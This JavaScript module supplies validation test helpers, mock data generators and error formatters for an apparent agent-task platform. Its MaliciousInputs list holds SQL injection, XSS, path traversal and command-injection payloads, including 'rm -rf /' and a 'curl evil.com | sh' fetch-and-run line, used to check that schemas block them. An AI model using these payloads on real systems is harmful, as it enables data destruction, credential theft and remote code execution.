/**
 * Validation Helper Utilities
 *
 * Provides testing utilities, mock data generators,
 * and validation helper functions
 */

import { v4 as uuidv4 } from 'uuid';
import {
  agentCreationSchema,
  taskSubmissionSchema,
  votingSessionCreationSchema,
  brainstormMessageSchema,
  achievementClaimSchema
} from '../schemas/index.js';

/**
 * Mock Data Generators
 */
export const MockDataGenerators = {
  /**
   * Generate valid agent data
   */
  generateAgent: (overrides = {}) => ({
    name: `Agent-${uuidv4().substring(0, 8)}`,
    role: 'worker',
    capabilities: ['compute', 'analyze'],
    resources: {
      cpu: 20,
      memory: 20,
      network: 100,
      storage: 100
    },
    metadata: {
      description: 'Test agent',
      tags: ['test', 'automated'],
      owner: 'test@example.com',
      team: 'TestTeam',
      version: '1.0.0'
    },
    config: {
      autoStart: true,
      maxConcurrentTasks: 5,
      taskTimeout: 60000,
      heartbeatInterval: 5000
    },
    ...overrides
  }),

  /**
   * Generate valid task data
   */
  generateTask: (overrides = {}) => ({
    title: `Task-${uuidv4().substring(0, 8)}`,
    type: 'compute',
    priority: 'normal',
    description: 'Test task for validation',
    input: { data: 'test' },
    config: {
      timeout: 300000,
      retryCount: 3,
      parallelizable: false
    },
    requirements: {
      resources: {
        cpu: { min: 10, preferred: 20, max: 50 }
      }
    },
    metadata: {
      submittedBy: 'test-user',
      project: 'test-project'
    },
    ...overrides
  }),

  /**
   * Generate valid voting session data
   */
  generateVotingSession: (overrides = {}) => ({
    topic: 'Test voting session',
    question: 'Which option should we choose for testing?',
    options: [
      { id: 'opt1', label: 'Option 1', description: 'First option' },
      { id: 'opt2', label: 'Option 2', description: 'Second option' },
      { id: 'opt3', label: 'Option 3', description: 'Third option' }
    ],
    algorithm: 'simple_majority',
    timing: {
      deadline: new Date(Date.now() + 3600000).toISOString()
    },
    metadata: {
      initiatedBy: 'test-user'
    },
    ...overrides
  }),

  /**
   * Generate valid brainstorm message
   */
  generateBrainstormMessage: (overrides = {}) => ({
    messageId: uuidv4(),
    type: 'brainstorm',
    from: `agent-${uuidv4()}`,
    payload: {
      sessionId: uuidv4(),
      action: 'initiate',
      initiation: {
        topic: 'Test brainstorming session',
        question: 'How can we improve our testing process?',
        context: 'We need better test coverage',
        minResponses: 2,
        maxResponses: 10,
        timeout: 60000
      }
    },
    ...overrides
  }),

  /**
   * Generate valid achievement claim
   */
  generateAchievementClaim: (overrides = {}) => ({
    agentId: `agent-${uuidv4()}`,
    achievementId: 'speed-demon',
    evidence: {
      taskCompletionTimes: [
        { taskId: uuidv4(), duration: 45000, timestamp: new Date().toISOString() },
        { taskId: uuidv4(), duration: 50000, timestamp: new Date().toISOString() }
      ],
      metrics: {
        totalTasks: 10,
        averageTime: 48000
      }
    },
    metadata: {
      autoDetected: true,
      confidence: 0.95
    },
    ...overrides
  })
};

/**
 * Malicious Input Generators (for testing security)
 */
export const MaliciousInputs = {
  sqlInjection: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM passwords --",
    "1; DELETE FROM tasks WHERE 1=1"
  ],

  xssAttacks: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert()'></iframe>",
    "<body onload=alert('XSS')>"
  ],

  commandInjection: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& shutdown now",
    "`rm -rf *`",
    "$(curl evil.com | sh)"
  ],

  pathTraversal: [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../.env",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//....//etc/passwd"
  ],

  noSqlInjection: [
    { $where: "this.password == 'test'" },
    { username: { $ne: null } },
    { $gt: "" },
    { $regex: ".*" }
  ]
};

/**
 * Validation Test Helpers
 */
export class ValidationTestHelper {
  /**
   * Test schema with valid data
   */
  static testValidData(schema, data) {
    const result = schema.validate(data);
    return {
      valid: !result.error,
      value: result.value,
      error: result.error?.details
    };
  }

  /**
   * Test schema with invalid data
   */
  static testInvalidData(schema, data) {
    const result = schema.validate(data);
    return {
      valid: !result.error,
      errors: result.error?.details?.map(d => ({
        field: d.path.join('.'),
        type: d.type,
        message: d.message
      }))
    };
  }

  /**
   * Test schema with malicious inputs
   */
  static async testSecurityValidation(schema, baseData, maliciousField) {
    const results = [];

    // Test SQL injection
    for (const injection of MaliciousInputs.sqlInjection) {
      const testData = { ...baseData, [maliciousField]: injection };
      const result = schema.validate(testData);
      results.push({
        type: 'SQL Injection',
        input: injection,
        blocked: !!result.error
      });
    }

    // Test XSS
    for (const xss of MaliciousInputs.xssAttacks) {
      const testData = { ...baseData, [maliciousField]: xss };
      const result = schema.validate(testData);
      results.push({
        type: 'XSS',
        input: xss,
        blocked: !!result.error
      });
    }

    return results;
  }

  /**
   * Generate test cases for a schema
   */
  static generateTestCases(schema, validData) {
    const testCases = [];

    // Test required fields
    const description = schema.describe();
    if (description.keys) {
      for (const [key, field] of Object.entries(description.keys)) {
        if (field.flags?.presence === 'required') {
          const testData = { ...validData };
          delete testData[key];
          testCases.push({
            name: `Missing required field: ${key}`,
            data: testData,
            expectedError: true,
            errorField: key
          });
        }
      }
    }

    // Test invalid types
    const typeTests = {
      string: 123,
      number: 'not a number',
      boolean: 'yes',
      object: 'not an object',
      array: 'not an array'
    };

    if (description.keys) {
      for (const [key, field] of Object.entries(description.keys)) {
        const fieldType = field.type;
        if (typeTests[fieldType] !== undefined) {
          const testData = { ...validData, [key]: typeTests[fieldType] };
          testCases.push({
            name: `Invalid type for field: ${key}`,
            data: testData,
            expectedError: true,
            errorField: key
          });
        }
      }
    }

    return testCases;
  }

  /**
   * Benchmark validation performance
   */
  static async benchmarkValidation(schema, data, iterations = 1000) {
    const start = Date.now();
    let valid = 0;
    let invalid = 0;

    for (let i = 0; i < iterations; i++) {
      const result = schema.validate(data);
      if (result.error) {
        invalid++;
      } else {
        valid++;
      }
    }

    const duration = Date.now() - start;

    return {
      iterations,
      duration,
      averageTime: duration / iterations,
      valid,
      invalid,
      opsPerSecond: (iterations / duration) * 1000
    };
  }
}

/**
 * Validation Error Formatter
 */
export class ValidationErrorFormatter {
  /**
   * Format Joi error for user display
   */
  static formatForUser(error) {
    if (!error || !error.details) {
      return 'Validation failed';
    }

    return error.details.map(detail => {
      const field = detail.path.join('.');
      const type = detail.type;

      // User-friendly messages
      const messages = {
        'any.required': `${field} is required`,
        'string.empty': `${field} cannot be empty`,
        'string.min': `${field} is too short`,
        'string.max': `${field} is too long`,
        'number.min': `${field} is too small`,
        'number.max': `${field} is too large`,
        'array.min': `${field} must have at least ${detail.context.limit} items`,
        'array.max': `${field} cannot have more than ${detail.context.limit} items`,
        'any.only': `${field} must be one of: ${detail.context.valids.join(', ')}`
      };

      return messages[type] || detail.message;
    }).join('; ');
  }

  /**
   * Format error for logging
   */
  static formatForLog(error, context = {}) {
    return {
      timestamp: new Date().toISOString(),
      type: 'VALIDATION_ERROR',
      context,
      errors: error.details?.map(d => ({
        field: d.path.join('.'),
        type: d.type,
        message: d.message,
        value: d.context?.value
      })),
      raw: error.message
    };
  }

  /**
   * Format error for API response
   */
  static formatForAPI(error, requestId = null) {
    return {
      error: {
        code: 'VALIDATION_ERROR',
        message: 'Request validation failed',
        requestId,
        timestamp: new Date().toISOString(),
        details: error.details?.map(d => ({
          field: d.path.join('.'),
          message: d.message,
          type: d.type
        }))
      }
    };
  }
}

/**
 * Schema Documentation Generator
 */
export class SchemaDocGenerator {
  /**
   * Generate markdown documentation for a schema
   */
  static generateMarkdown(schema, title = 'Schema Documentation') {
    const description = schema.describe();
    let markdown = `# ${title}\n\n`;

    if (description.keys) {
      markdown += '## Fields\n\n';
      markdown += this.generateFieldsTable(description.keys);
    }

    if (description.rules) {
      markdown += '\n## Validation Rules\n\n';
      markdown += this.generateRulesList(description.rules);
    }

    return markdown;
  }

  /**
   * Generate fields table
   */
  static generateFieldsTable(keys) {
    let table = '| Field | Type | Required | Description |\n';
    table += '|-------|------|----------|-------------|\n';

    for (const [name, field] of Object.entries(keys)) {
      const required = field.flags?.presence === 'required' ? 'Yes' : 'No';
      const description = field.notes?.join(' ') || '-';
      table += `| ${name} | ${field.type} | ${required} | ${description} |\n`;
    }

    return table;
  }

  /**
   * Generate validation rules list
   */
  static generateRulesList(rules) {
    return rules.map(rule => `- ${rule.name}: ${JSON.stringify(rule.args)}`).join('\n');
  }

  /**
   * Generate JSON schema from Joi schema
   */
  static generateJSONSchema(joiSchema) {
    const description = joiSchema.describe();
    return this.convertToJSONSchema(description);
  }

  /**
   * Convert Joi description to JSON schema
   */
  static convertToJSONSchema(description) {
    const jsonSchema = {
      type: 'object',
      properties: {},
      required: []
    };

    if (description.keys) {
      for (const [name, field] of Object.entries(description.keys)) {
        jsonSchema.properties[name] = this.convertFieldToJSONSchema(field);

        if (field.flags?.presence === 'required') {
          jsonSchema.required.push(name);
        }
      }
    }

    return jsonSchema;
  }

  /**
   * Convert field to JSON schema
   */
  static convertFieldToJSONSchema(field) {
    const typeMap = {
      string: 'string',
      number: 'number',
      boolean: 'boolean',
      object: 'object',
      array: 'array',
      date: 'string'
    };

    const jsonField = {
      type: typeMap[field.type] || 'string'
    };

    if (field.notes) {
      jsonField.description = field.notes.join(' ');
    }

    if (field.rules) {
      field.rules.forEach(rule => {
        if (rule.name === 'min') {
          jsonField.minimum = rule.args.limit;
        } else if (rule.name === 'max') {
          jsonField.maximum = rule.args.limit;
        } else if (rule.name === 'pattern') {
          jsonField.pattern = rule.args.regex.toString();
        }
      });
    }

    return jsonField;
  }
}

/**
 * Export all utilities
 */
export default {
  MockDataGenerators,
  MaliciousInputs,
  ValidationTestHelper,
  ValidationErrorFormatter,
  SchemaDocGenerator
};